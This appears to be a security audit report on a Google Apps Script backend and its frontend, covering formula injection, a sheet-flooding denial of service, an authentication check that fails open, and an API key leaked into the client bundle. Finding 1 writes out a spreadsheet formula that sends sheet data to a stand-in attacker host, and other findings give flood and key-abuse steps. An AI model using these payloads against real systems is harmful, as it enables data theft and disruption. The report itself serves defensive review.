# Findings Detail (Data Flows & Reproduction)

---

## Finding 1: Google Sheets Formula Injection (CSV / Excel Formula Injection) in GAS Backend

### Metadata
- **Severity**: HIGH
- **Component**: Google Apps Script Backend (`gas/Code.gs`)
- **Vulnerability Class**: CWE-1236 (Improper Neutralization of Formula Elements in CSV File)

### Data Flow Trace
1. **Entrypoint** ([gas/Code.gs:32](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L32)):
   `doPost(e)` receives HTTP POST request payload (`e.postData.contents`).
2. **Propagation** ([gas/Code.gs:57-64](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L57-L64)):
   `parseCsvLine(line)` splits the CSV text into fields and populates an array of objects `records` without checking whether field values begin with formula triggers (`=`, `+`, `-`, `@`, `\t`, `\r`).
3. **Propagation** ([gas/Code.gs:81, 94](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L81-L94)):
   `records` are passed into `appendRows(sheetName, headers, groups[sheetName])`.
4. **Sink** ([gas/Code.gs:271](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L271)):
   `sheet.getRange(sheet.getLastRow() + 1, 1, rows.length, headers.length).setValues(rows)` inserts raw strings into Google Sheets cells. Google Sheets evaluates strings beginning with `=` as formulas.

### Reproduction / Exploitation
```http
POST https://script.google.com/macros/s/<DEPLOYMENT_ID>/exec?type=sn HTTP/1.1
Host: script.google.com
Content-Type: text/plain;charset=utf-8

date,route,direction,lane,mileage,sn
2025-01-01,國道1號,南下,外側車道,100,"=IMPORTXML(CONCAT(""https://attacker.com/leak?data="", JOIN("","", A1:Z100)), ""//a"")"
```

### Impact & Attacker Outcome
When an administrative user or operator opens the spreadsheet in Google Sheets, the formula runs in the user's active session, silently querying `https://attacker.com` and exfiltrating historical pavement data, sheet metadata, or connected user information.

### Baseline Comparable Comparison
In standard Google Sheets integration architectures, user-supplied text written via Sheets API or Apps Script `setValues()` must be prefixed with a single quote character (`'`) to force Google Sheets to store the value as a plain string literal (`CellFormat.TEXT`).

---

## Finding 2: Uncontrolled Sheet Creation Resource Exhaustion (DoS) in GAS Backend

### Metadata
- **Severity**: MEDIUM
- **Component**: Google Apps Script Backend (`gas/Code.gs`)
- **Vulnerability Class**: CWE-400 (Uncontrolled Resource Consumption)

### Data Flow Trace
1. **Entrypoint** ([gas/Code.gs:32](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L32)):
   `doPost(e)` receives user-provided CSV data.
2. **Propagation** ([gas/Code.gs:74, 88](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L74-L88)):
   `routeSafe` and `iriSheetName(r.route, r.direction, r.lane)` construct worksheet names dynamically from unvalidated `route`, `direction`, and `lane` fields.
3. **Sink** ([gas/Code.gs:254](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L254)):
   `getOrCreateSheet` calls `sheet = ss.insertSheet(sheetName)` for every unique sheet name generated.

### Reproduction / Exploitation
```http
POST https://script.google.com/macros/s/<DEPLOYMENT_ID>/exec?type=iri HTTP/1.1
Host: script.google.com
Content-Type: text/plain;charset=utf-8

date,time,route,direction,lane,mileage,avgIri,avgPrqi
2025-01-01,10:00:00,RouteFlood001,南下,外側車道,100,1.2,1.1
2025-01-01,10:00:00,RouteFlood002,南下,外側車道,100,1.2,1.1
... (up to 5000 lines)
```

### Impact & Attacker Outcome
Creating hundreds of sheets in a single request exhausts Google Sheets execution quotas (Google Apps Script 6-minute timeout), corrupts database navigation, and causes subsequent `doGet?type=all` operations to fail or time out.

### Baseline Comparable Comparison
Enterprise backend systems validate dynamic table/collection names against strict schema definitions or predefined route identifiers rather than dynamically generating database structures from unverified input fields.

---

## Finding 3: Default-Open Authentication Bypass when API_SECRET is Unset

### Metadata
- **Severity**: MEDIUM
- **Component**: Google Apps Script Backend (`gas/Code.gs`)
- **Vulnerability Class**: CWE-287 / CWE-306 (Missing / Broken Authentication)

### Data Flow Trace
1. **Entrypoint** ([gas/Code.gs:34, 114](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L34-L114)):
   Incoming `doPost` and `doGet` handlers invoke `if (!isAuthorized(e)) return Unauthorized`.
2. **Sink** ([gas/Code.gs:17](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/gas/Code.gs#L17)):
   `isAuthorized` evaluates:
   ```javascript
   if (!API_SECRET) return true;
   ```
   If `API_SECRET` is unset, `isAuthorized` returns `true`, completely disabling authentication.

### Reproduction / Exploitation
```http
GET https://script.google.com/macros/s/<DEPLOYMENT_ID>/exec?type=all HTTP/1.1
Host: script.google.com
```

### Impact & Attacker Outcome
If an administrator deploys the GAS script or clones it to a new environment without immediately setting `API_SECRET` in `ScriptProperties`, anyone on the public internet can read or overwrite all data in the Google Sheet.

### Baseline Comparable Comparison
Secure architectures follow the "Fail Closed" principle: if authentication credentials or secret keys are missing, the system must abort and reject all requests with a 401/403 or configuration error.

---

## Finding 4: Client-Side Secret Embedding and Ineffective Backend Authentication Architecture

### Metadata
- **Severity**: MEDIUM
- **Component**: Frontend Client & Build Pipeline (`src/lib/gasService.ts`, `vite.config.ts`, `.github/workflows/deploy.yml`)
- **Vulnerability Class**: CWE-798 (Use of Hard-coded / Client-exposed Credentials)

### Data Flow Trace
1. **Entrypoint** ([src/lib/gasService.ts:8](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/src/lib/gasService.ts#L8), [vite.config.ts:23](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/vite.config.ts#L23)):
   `VITE_GAS_API_KEY` and `GEMINI_API_KEY` are read into the Vite client bundle at build time.
2. **Propagation** ([src/lib/gasService.ts:13](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/src/lib/gasService.ts#L13)):
   `buildUrl` attaches `key=${API_KEY}` to every API request URL.
3. **Sink** ([src/lib/gasService.ts:40](file:///c:/Users/linyu/.gemini/data-analysis/data-analysis/src/lib/gasService.ts#L40), `dist/assets/*.js`):
   The secret key is embedded into static JavaScript files served on GitHub Pages and sent in cleartext URL parameters across the network.

### Reproduction / Exploitation
1. Visit the deployed website on GitHub Pages.
2. Open Browser DevTools (F12) -> Sources / Network.
3. Search for `VITE_GAS_API_KEY` or inspect outgoing requests to `https://script.google.com/.../exec?key=...`.
4. Copy the key and use `curl` or Postman to manipulate the database directly.

### Impact & Attacker Outcome
The `API_SECRET` in GAS fails to protect against unauthorized write or read operations by web clients, because every user visiting the website is automatically granted the secret key.

### Baseline Comparable Comparison
Single Page Applications on static hosting (e.g. GitHub Pages) must not use shared symmetric secrets for authorization. Instead, they should utilize OAuth 2.0 (Google Identity Services / OIDC) to authenticate individual users against Google Apps Script or a secure proxy API.
